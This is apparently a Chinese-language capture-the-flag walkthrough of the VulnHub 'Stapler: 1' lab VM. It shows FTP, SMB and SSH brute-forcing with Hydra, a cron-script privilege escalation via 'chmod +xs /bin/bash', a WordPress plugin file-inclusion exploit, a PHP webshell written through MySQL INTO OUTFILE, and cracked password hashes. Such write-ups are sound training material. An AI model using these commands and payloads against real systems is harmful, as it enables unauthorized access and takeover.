# Stapler: 1

https://www.vulnhub.com/entry/stapler-1,150/

difficulty: beginner/intermediate

Finish Date：2024-4-14

## IP

192.168.10.161

## Scan

开放的端口有点多。

Open Port -> 20,21,22,53,80,123,137,138,139,666,3306,12380

```
PORT      STATE  SERVICE
20/tcp    closed ftp-data
21/tcp    open   ftp
22/tcp    open   ssh
53/tcp    open   domain
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn
666/tcp   open   doom
3306/tcp  open   mysql
12380/tcp open   unknown
```

先看看 ftp 21 上有什么信息，可以匿名登陆，有一个 note 文件，看看什么内容。

banner 内容：

```
Harry, make sure to update the banner when you get a chance to show who has access here
```

noet 文件内容：

```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

根据上面提示，获得了 2 个账户名：elly、john，但是密码不知道，尝试了一下 elly:elly 凭证登陆不成功。

还有 smb 服务，使用 enum4linux -a 192.168.10.161 枚举，看看有什么信息。

```
//192.168.10.161/print$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.10.161/kathy	Mapping: OK Listing: OK Writing: N/A
//192.168.10.161/tmp	Mapping: OK Listing: OK Writing: N/A
```

smbclient -N //192.168.10.161/kathy 得到如下内容：

```
kathy_stuff                         D        0  Sun Jun  5 23:02:27 2016
backup                              D        0  Sun Jun  5 23:04:14 2016
```

kathy_stuff 中有个 todo-list.txt 文件，backup 中有 vsftpd.conf、wordpress-4.tar.gz，把这几个文件下载到 kali 上进行分析。

todo-list.txt 中说：I'm making sure to backup anything important for Initech, Kathy 提示我们 backup 中有重要的备份；vsftpd.conf 文件应该是靶机的 ftp 服务的配置文件；wordpress-4.tar.gz 中可能有配置连接数据库的用户名和密码，查看后发现没有配置。

smbclient -N //192.168.10.161/tmp 中只有一个 ls 文件，也下载到 kali 上进行分析。

```
drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
```

同时看到了一堆账户：

```
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
```

对用户名进行处理，得到最终的用户名：

```
cat user| cut -d '\' -f2| cut -d ' ' -f1 > user.txt

eter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

尝试用这个用户名也作为密码字典进行 FTP 爆破，得到一个用户凭据：

```
hydra -t 20 -L user.txt -P user.txt  ftp://192.168.10.161

[21][ftp] host: 192.168.10.161   login: SHayslett   password: SHayslett
```

ftp 进入后，发现了一堆系统文件，查看后，没发现什么有用的信息。既然 ftp 能登陆，能不能这个凭证也能登陆 ssh，尝试进行 ssh 爆破：

```
hydra -t 20 -L user.txt -P user.txt  ssh://192.168.10.161

[22][ssh] host: 192.168.10.161   login: SHayslett   password: SHayslett
```

使用 linpeas 进行系统枚举，发现了一些重要枚举信息：

-   系统内核版本为：4.4.0-21-generic，可能存在一些列内核漏洞;
-   发现 /usr/local/sbin/cron-logrotate.sh 我们具有写入权限，并且这个文件是每隔 5 分钟执行一次

## 提权方式 1：

```bash
SHayslett@red:~$ cd /etc/cron.d
SHayslett@red:/etc/cron.d$ ls
logrotate  mdadm  php
SHayslett@red:/etc/cron.d$ ls -al
total 32
drwxr-xr-x   2 root root  4096 Jun  3  2016 .
drwxr-xr-x 100 root root 12288 Apr 14 12:18 ..
-rw-r--r--   1 root root    56 Jun  3  2016 logrotate
-rw-r--r--   1 root root   589 Jul 16  2014 mdadm
-rw-r--r--   1 root root   670 Mar  1  2016 php
-rw-r--r--   1 root root   102 Jun  3  2016 .placeholder
SHayslett@red:/etc/cron.d$ cat logrotate
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
```

所以第一种提权到 root 的方式就是将提权代码写入到这个文件中，等待 5 分钟触发：

```
echo 'chmod +xs /bin/bash' >> /usr/local/sbin/cron-logrotate.sh
```

service 触发后，得到了 root 下的 flag：

```
SHayslett@red:/etc/cron.d$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1109520 Sep  1  2015 /bin/bash
SHayslett@red:/etc/cron.d$ /bin/bash -p
bash-4.3# id
uid=1005(SHayslett) gid=1005(SHayslett) euid=0(root) egid=0(root) groups=0(root),1005(SHayslett)
bash-4.3# cd /root
bash-4.3# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
bash-4.3# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

```

## 提权方式 2：

在用 SHayslett:SHayslett ssh 登陆到系统后，在/home 目录下发现了一堆用户，尝试使用 grep -rn "ssh" 看是否能找到敏感信息，最终发现：

```
JKanode/.bash_history:8:sshpass -p JZQuyIN5 peter@localhost
JKanode/.bash_history:6:sshpass -p thisimypassword ssh JKanode@localhost
```

发现用户凭证 JKanode:thisimypassword、peter:JZQuyIN5 切换到 peter 用户后，sudo -l 发现用户有全部权限，所以直接 sudo cat /root/flag.txt 读取到最终的 flag。

## 提权方式 3：

该内核版本存在漏洞，找到了相应的 exp https://www.exploit-db.com/exploits/39772

## 提权方式 4：

使用 nc 192.168.10.161 666 发现会传输过来一个 zip 文件，进行保存： nc 192.168.10.161 666 > 1.zip，查看 zip 中有一个图片 message2.jpg，内容为：

```
echo Hello,World
~$echo Scott, please change this messagesegmentation fault
```

访问 http://192.168.10.161/ 看看有什么内容，页面和源代码上没找到什么信息，使用目录扫描看看有什么，有两个文件：/.profile 和 /.bashrc，进行查看，也没发现什么有用的信息。

访问另一个 web 端口的 http://192.168.10.161:12380/ ，主页和源代码上都没什么有用信息，用目录扫描工具也没扫除什么目录。但是 web 上应该有一些重要信息，有没有可能是在 https 下访问的，进行尝试 https://192.168.10.161:12380/ ，出现了一个：Internal Index Page! 好像有戏，继续用目录扫描工具进行扫描：

```
gobuster dir -t 64 -k -w ~/tools/dict/fileName5000.txt -u https://192.168.10.161:12380/

/announcements        (Status: 301) [Size: 334] [--> https://192.168.10.161:12380/announcements/]
/index.html           (Status: 200) [Size: 21]
/javascript           (Status: 301) [Size: 331] [--> https://192.168.10.161:12380/javascript/]
/phpmyadmin           (Status: 301) [Size: 331] [--> https://192.168.10.161:12380/phpmyadmin/]
/robots.txt           (Status: 200) [Size: 59]
```

https://192.168.10.161:12380/announcements/message.txt 对应的内容：Abby, we need to link the folder somewhere! Hidden at the mo

https://192.168.10.161:12380/phpmyadmin/ 是一个 phpmyadmin，但是我们目前不知道账号和密码，暂时登陆不了。

访问下 https://192.168.10.161:12380/robots.txt 看看有什么：

```
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

https://192.168.10.161:12380/admin112233/ 弹出框：This could of been a BeEF-XSS hook ;) 看样子被植入了 BEFF 代码，最后跳转到了一个公网的网站。

https://192.168.10.161:12380/blogblog/ 是一个 wordpress 搭建的网站，先使用 wpscan 进行扫描进行枚举：

```
wpscan --disable-tls-checks --url https://192.168.10.161:12380/blogblog/

找到了theme：bhost 1.2.9
发现了一堆用户：john、elly、peter、barry、heather、garry、harry、scott、kathy、tim
```

同时发现了插件：https://192.168.10.161:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/ 这个插件存在漏洞，可以进行利用。 https://www.exploit-db.com/exploits/39646 可以本地文件包含读取敏感数据。网站使用了 ssl，需要在代码中加上这一段代码：

```
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
```

用 python2 执行后，在 https://192.168.10.161:12380/blogblog/wp-content/uploads/ 目录下出现了一个图片，然后使用 cat 进行查看，得到了 wp-config.php 中的内容。

```
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');
define('DB_HOST', 'localhost');
```

### 第 1 种获得 webshell 方法：

可以用 mysql 客户端远程连接数据库：mysql -h 192.168.10.161 -u root -p，查看 show variables like '%sec%'; 发现没有设置，说明我们可以写数据到文件中，可以写一个 webshell 到 web 目录中：

```
select "<?php system($_GET['cmd']);?>" into outfile '/var/www/https/blogblog/wp-content/uploads/shell.php';
```

然后我们访问 https://192.168.10.161:12380/blogblog/wp-content/uploads/shell.php?cmd=id 证明能执行 RCE，就可以执行反弹连接到 nc 进行后续提权操作。

### 第 2 种获得 webshell 方法：

得到了数据库的信息，我们就能用前面发现的 phpmyadmin 进行登陆了，在 wordpress 中的 wp_users 表中获得了用户名和用户哈希数据，使用 John 继续破解明文密码：

```
$P$B7889EMq/erHIuZapMB8GEizebcIy9.   (这个是administrator) --> John:incorrect
$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0
$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0   (这个是administrator)
$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0   --> washere
$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10
$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1   --> garry:football
$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0   --> harry:monkey
$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1   --> scott:cookie
$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0   --> kathy:coolgirl
$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0
$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1
$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.
$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0
$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.
$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131  (这个是administrator)
$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0
```

找到其中是管理员的用户，根据 wpusermata 表中的数据，发现 user id 为 1、3、15 的用户是管理员。发现 John:incorrect 是管理员，进行登陆 https://192.168.10.161:12380/blogblog/wp-login.php ，在 https://192.168.10.161:12380/blogblog/wp-admin/plugin-install.php?tab=upload 中上传一个 php web shell，然后保存，在 https://192.168.10.161:12380/blogblog/wp-content/uploads/ 中就能访问，就可以触发 web shell 进行反弹。

后续的提权方式跟第 1 和第 2 中提权方式一样。
